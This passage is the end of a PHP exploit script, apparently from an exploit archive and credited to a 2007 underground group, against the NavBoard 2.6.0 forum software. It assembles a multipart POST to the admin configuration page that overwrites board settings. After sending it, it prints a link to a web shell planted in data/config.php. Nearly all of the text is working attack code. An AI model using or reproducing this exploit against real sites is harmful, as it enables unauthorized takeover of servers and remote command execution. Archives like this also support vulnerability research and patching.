name=\"maxpmnumber\"\r\n\r\nDj7xpl\r\n-----------------------------7d6224c08dc\r\nContent-Disposition: form-data; name=\"maxtotalattachsize\"\r\n\r\nred\r\n-----------------------------7d6224c08dc\r\nContent-Disposition: form-data; name=\"allowdupdisplay\"\r\n\r\nred\r\n-----------------------------7d6224c08dc\r\nContent-Disposition: form-data; name=\"defaulttime\"\r\n\r\nred\r\n-----------------------------7d6224c08dc\r\nContent-Disposition: form-data; name=\"textlogo\"\r\n\r\nred\r\n-----------------------------7d6224c08dc\r\nContent-Disposition: form-data; name=\"adminemail\"\r\n\r\nred\r\n-----------------------------7d6224c08dc\r\nContent-Disposition: form-data; name=\"mainwebsite\"\r\n\r\nred\r\n-----------------------------7d6224c08dc\r\nContent-Disposition: form-data; name=\"postfloodcontrolsec\"\r\n\r\nred\r\n-----------------------------7d6224c08dc\r\nContent-Disposition: form-data; name=\"regfloodcontrolsec\"\r\n\r\nred\r\n-----------------------------7d6224c08dc\r\nContent-Disposition: form-data; name=\"registration\"\r\n\r\nred\r\n-----------------------------7d6224c08dc\r\nContent-Disposition: form-data; name=\"boardclosing\"\r\n\r\nred\r\n-----------------------------7d6224c08dc\r\nContent-Disposition: form-data; name=\"displaychange\"\r\n\r\nred\r\n-----------------------------7d6224c08dc\r\nContent-Disposition: form-data; name=\"replies\"\r\n\r\nred\r\n-----------------------------7d6224c08dc\r\nContent-Disposition: form-data; name=\"dontscanreplycount\"\r\n\r\nred\r\n-----------------------------7d6224c08dc\r\nContent-Disposition: form-data; name=\"nestedbbcodes\"\r\n\r\nred\r\n-----------------------------7d6224c08dc\r\nContent-Disposition: form-data; name=\"indentspacing\"\r\n\r\nred\r\n-----------------------------7d6224c08dc\r\nContent-Disposition: form-data; name=\"userlevelnames\"\r\n\r\nred\r\n-----------------------------7d6224c08dc\r\nContent-Disposition: form-data; name=\"showalledits\"\r\n\r\nred\r\n-----------------------------7d6224c08dc\r\n';\r\n\r\n\r\n/*Echo Header*/\r\necho \"[!] NavBoard 2.6.0\\r\\n\";\r\necho \"[!] Powered By Y! Underground Group\\r\\n\";\r\necho \"[!] Vuln And Coded By Dj7xpl\\r\\n\";\r\n\r\n/*Sending Data*/\r\n$packet =\"POST \".$path.\"admin_config.php HTTP/1.0\\r\\n\";\r\n$packet.=\"Content-Type: multipart/form-data; boundary=---------------------------7d6224c08dc\\r\\n\";\r\n$packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Accept-Language: en\\r\\n\";\r\n$packet.=\"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n$packet.=$data;\r\nsendpacket($packet);\r\nsleep(2);\r\nEcho \"[!] Shell : http://\".$host.$path.\"data/config.php?shell=Evil Text\\r\\n\";\r\n\r\n?>\r\n\r\n# milw0rm.com [2007-05-23]",
  "url": "https://www.exploit-db.com/exploits/3971"
}